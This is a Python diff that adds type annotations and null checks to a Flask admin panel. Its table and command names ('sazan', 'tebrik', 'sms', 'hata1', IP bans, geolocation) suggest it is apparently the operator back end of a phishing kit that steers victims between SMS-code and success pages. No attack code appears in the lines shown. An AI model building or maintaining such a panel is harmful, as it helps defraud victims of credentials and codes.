@@ -2,7 +2,7 @@ from __future__ import annotations
 
 from datetime import datetime, timedelta, timezone
 from functools import wraps
-from typing import Callable, Optional
+from typing import Any, Callable, Optional
 
 import requests
 from flask import Blueprint, flash, redirect, render_template, request, session, url_for
@@ -38,7 +38,7 @@ admin_bp = Blueprint(
     static_url_path="/admin/assets",
 )
 
-COMMAND_TABLES = {
+COMMAND_TABLES: dict[str, tuple[str, str]] = {
     "sms": ("sms", "sms"),
     "tebrik": ("tebrik", "tebrik"),
     "hata1": ("hata1", "hata1"),
@@ -50,9 +50,9 @@ def _is_logged_in() -> bool:
     return bool(session.get("admin_authenticated"))
 
 
-def _login_required(view: Callable):
+def _login_required(view: Callable[..., Any]) -> Callable[..., Any]:
     @wraps(view)
-    def wrapper(*args, **kwargs):
+    def wrapper(*args: Any, **kwargs: Any) -> Any:
         if not _is_logged_in():
             session["admin_next"] = request.path
             return redirect(url_for("admin.login"))
@@ -91,15 +91,15 @@ def _remove_panel_entry() -> None:
         cursor.execute("DELETE FROM paneldekiler WHERE ip=?", (ip_address,))
 
 
-def _fetch_site_settings() -> dict:
+def _fetch_site_settings() -> dict[str, Any]:
     with get_cursor() as cursor:
         cursor.execute("SELECT * FROM site WHERE id=1")
         row = cursor.fetchone()
         return dict(row) if row else {}
 
 
-def _get_dashboard_stats() -> dict:
-    stats = {
+def _get_dashboard_stats() -> dict[str, Any]:
+    stats: dict[str, Any] = {
         "logs": 0,
         "bans": 0,
         "online": 0,
@@ -109,16 +109,20 @@ def _get_dashboard_stats() -> dict:
     current_ts = int(datetime.now(tz=timezone.utc).timestamp())
     with get_cursor() as cursor:
         cursor.execute("SELECT COUNT(*) AS total FROM sazan")
-        stats["logs"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["logs"] = result["total"] if result else 0
 
         cursor.execute("SELECT COUNT(*) AS total FROM ban")
-        stats["bans"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["bans"] = result["total"] if result else 0
 
         cursor.execute("SELECT COUNT(*) AS total FROM ips WHERE lastOnline > ?", (current_ts,))
-        stats["online"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["online"] = result["total"] if result else 0
 
         cursor.execute("SELECT COUNT(*) AS total FROM sazan WHERE now='Tebrik Sayfası'")
-        stats["tebrik"] = cursor.fetchone()["total"]
+        result = cursor.fetchone()
+        stats["tebrik"] = result["total"] if result else 0
 
         cursor.execute("SELECT tarayici, COUNT(*) AS total FROM sazan GROUP BY tarayici")
         for row in cursor.fetchall():
@@ -136,10 +140,10 @@ def _handle_command(action: str, value: str) -> bool:
     return True
 
 
-def _resolve_ssl_hosts(app_settings: dict | None) -> list[str]:
+def _resolve_ssl_hosts(app_settings: dict[str, Any] | None) -> list[str]:
     if not app_settings:
         return configured_host_list()
-    hosts_raw = app_settings.get("ssl_hosts") or ""
+    hosts_raw = str(app_settings.get("ssl_hosts") or "")
     host_list = [host.strip() for host in hosts_raw.split(",") if host and host.strip()]
     return host_list or configured_host_list()
 
@@ -151,11 +155,11 @@ def _geolocate_ip(ip_address: str) -> str:
             params={"ip": ip_address},
             timeout=3,
         )
-        data = response.json()
+        data: Any = response.json()
     except Exception:
         return ""
-    city = (data or {}).get("geoplugin_city") or ""
-    country = (data or {}).get("geoplugin_countryName") or ""
+    city = str((data or {}).get("geoplugin_city") or "")
+    country = str((data or {}).get("geoplugin_countryName") or "")
     location = city.strip()
     if country:
         location = f"{location} [{country}]" if location else f"[{country}]"
